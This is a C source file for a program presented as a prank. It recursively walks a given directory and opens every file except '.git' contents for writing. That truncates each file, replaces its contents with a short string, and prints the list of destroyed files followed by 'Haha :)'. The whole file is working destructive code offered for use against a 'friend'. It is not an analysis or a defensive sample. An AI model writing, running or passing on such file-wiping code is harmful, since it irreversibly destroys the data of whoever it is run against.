#include "main.h"

#define CORRUPT 1 // <- change this one to prank you "friend"
#define WRITE_WHAT "rakivo\n" // <- change this one to change the content that will be written

const char* const IGNORED[IGNORED_CAP] = {".", "..", ".git"};

char** corrupted_files;
long long unsigned int corrupted_files_counter = 0;
size_t corrupted_files_curr_cap = CORRUPTED_FILES_CAP;

void write(const char* const file_name, FILE* file)
{
    if (!file) {
        printf("ERROR: Couldn't open file: %s!\n", file_name);
        exit(1);
    }

    fprintf(file, WRITE_WHAT);

    if (corrupted_files_counter <= 1000000) {
        if (corrupted_files_counter == corrupted_files_curr_cap) {
            corrupted_files = realloc(corrupted_files,
            (corrupted_files_curr_cap *= 1.5) * sizeof(char*));
            if (!corrupted_files) {
                fprintf(stderr, "ERROR: Couldn't reallocate memory for corrupted file: %s\n",
                strerror(errno));

                exit(1);
            }
        }

        corrupted_files[corrupted_files_counter] = malloc(strlen(file_name) + 1);
        if (!corrupted_files[corrupted_files_counter]) {
            fprintf(stderr, "ERROR: Couldn't allocate memory for corrupted file: %s\n",
            strerror(errno));

            exit(1);
        }

        strcpy(corrupted_files[corrupted_files_counter], file_name);
        corrupted_files_counter++;
    } // prevent stack overflow

    fclose(file);
}

void corrupt(const char* const dir_path)
{
#ifdef _WIN32
    OPEN_DIR(hFind, findData, dir_path);
#else
    OPEN_DIR(dp, ep, dir_path);
#endif

#ifdef _WIN32
    while(FindNextFile(hFind, &findData)) {
        const char* name = findData.cFileName;
#else
    while ((ep = readdir(dp))) {
        const char* name = ep->d_name;
#endif

        if (isignored(name) == 0) continue;

        char path[PATH_CAP];
        GET_PATH(path, dir_path, name);

        if (isfile(path)) {
            write(path, fopen(path, "w"));
        } else {
            corrupt(path);
        }
    }

#ifdef _WIN32
    FindClose(hFind);
#else
    if (closedir(dp) != 0) {
        fprintf(stderr, "ERROR: Couldn't close directory \"%s\": %s\n",
                dir_path,
                strerror(errno));

        exit(1);
    }
#endif
}

int main(const int argc, const char* const* const argv)
{
    if (argc != 2) {
        printf("USAGE: %s <dir_path>\n", argv[0]);
        return 1;
    }

#if CORRUPT
    corrupted_files = malloc(CORRUPTED_FILES_CAP * sizeof(char*));
    if (!corrupted_files) {
        fprintf(stderr, "ERROR: Couldn't allocate memory for corrupted file: %s\n",
                strerror(errno));
        return 1;
    }

    corrupt(argv[1]);

    printf(  "< ==================== +++ +++ ==================== >\n");
    printf("Now you have %llu corrupted files, here they all are: ",
            corrupted_files_counter);
    printf("\n< ==================== +++ +++ ==================== >\n\n");

    for (size_t i = 0; i < corrupted_files_counter; ++i) {
        printf("%s\n", corrupted_files[i]);
        free(corrupted_files[i]);
    }

    free(corrupted_files);

    printf("Haha :)");
#endif

    return 0;
}
